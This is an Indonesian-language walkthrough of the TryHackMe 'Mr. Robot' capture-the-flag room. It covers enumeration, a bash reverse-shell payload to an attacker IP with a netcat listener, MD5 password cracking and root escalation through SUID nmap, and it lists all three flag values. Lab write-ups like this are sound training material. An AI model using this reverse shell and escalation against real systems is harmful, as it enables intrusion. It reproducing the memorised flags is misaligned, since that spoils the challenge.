#  Mr. Robot CTF – TryHackMe

**Nama:** Jonathan Jethro  
**Tanggal:** 4 Mei 2025  
**Link Room:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

---

## Pendahuluan

Mr. Robot adalah CTF dari TryHackMe yang terinspirasi dari serial TV populer.  
Tujuan utama adalah mendapatkan ketiga flag tersembunyi melalui tahapan:

- Web enumeration  
- Eksploitasi login  
- Privilege escalation

---

## Enumerasi

### Nmap Scan

```bash
nmap -sC -sV -oA scans/initial 10.10.180.146
```
Port terbuka:

80 (HTTP)

443 (HTTPS)

Situs menampilkan tema Mr. Robot.

robots.txt
```bash
Copy
Edit
User-agent: *
fsocity.dic
key-1-of-3.txt
```
Ditemukan wordlist fsocity.dic dan flag pertama.

## Eksploitasi Login
Setelah brute-force menggunakan fsocity.dic, ditemukan:

Username: elliot

Namun login berhasil dengan metode:

Menemukan halaman vulnerable upload.

Mengirim reverse shell (bash payload).

Mendengarkan dengan netcat.

```
# Reverse shell payload
bash -i >& /dev/tcp/10.9.0.247/4444 0>&1

# Listener (attacker)
nc -lvnp 4444
```
Shell berhasil dengan user: daemon.

## Privilege Escalation ke robot
Ditemukan file password:

```
cat /home/robot/password.raw-md5
```
Isi:
```
c3fcd3d76192e4007dfb496cca67e13b
```
Didekripsi menggunakan CrackStation:

Password: abcdefghijklmnopqrstuvwxyz

Login:
```
su robot
```
Berhasil menjadi user robot, ditemukan flag kedua.

## Privilege Escalation ke Root
User robot tidak punya akses sudo.
Lalu dicari file SUID:
```
find / -perm -4000 -type f 2>/dev/null
```
Ditemukan:
```
/usr/local/bin/nmap
```
Masuk ke mode interaktif:
```
/usr/local/bin/nmap --interactive
nmap> !sh
```
Berhasil mendapatkan shell sebagai root dan mengambil flag ketiga.

## Flag Capture
Flag	Lokasi	Isi
1	/key-1-of-3.txt	073403c8a58a1f80d943455fb30724b9
2	/home/robot/key-2-of-3.txt	822c73956184f694993bede3eb39f959
3	/root/key-3-of-3.txt	04787ddef27c3dee1ee161b21670b4e4

## Kesimpulan
CTF ini mengajarkan teknik penting dalam pentesting:

Enumerasi file tersembunyi dan wordlist

Reverse shell manual

Cracking password MD5

Privilege escalation via SUID binary (nmap --interactive)

## Screenshots
Lihat folder screenshots/ untuk gambar pendukung flag.

## Versi PDF
Tersedia juga dalam format PDF untuk dilihat secara offline.
